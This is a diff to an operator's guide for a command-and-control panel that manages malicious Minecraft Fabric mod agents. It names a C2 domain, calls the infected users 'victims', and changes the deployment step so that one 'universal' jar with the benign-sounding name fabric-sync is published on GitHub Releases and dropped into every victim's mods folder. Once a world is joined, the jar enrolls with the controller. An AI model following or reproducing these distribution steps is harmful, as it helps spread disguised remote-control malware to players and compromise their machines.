@@ -108,11 +108,13 @@ password from **Settings** immediately.
 ## 6. First build and victim
 
 1. Sign in at `https://c2.spc-cloud.net`.
-2. **Builds → new build**, set name/version/profile.
-3. Copy the build token, press the hammer to compile.
-4. Download the jar and place it in the client `mods/` folder together with Fabric
-   Loader 0.20.1 and Fabric API 0.92.12+1.20.1.
-5. The agent enrolls within 30 s of joining a world; it appears under **Victims**.
+2. The published release jar is already universal: download `fabric-sync-<version>.jar`
+   from GitHub Releases and place it in the client `mods/` folder together with Fabric
+   Loader 0.20.1 and Fabric API 0.92.12+1.20.1. Reuse the same file for every victim.
+3. The agent enrolls within 30 s of joining a world; it appears under **Victims**.
+4. The universal build lives under **Builds** with a `universal` badge. Revoking it
+   revokes every agent using the release jar.
+5. A per-person/per-group jar is still available: **Builds → new build → hammer → download**.
 
 ## 7. Operations
 
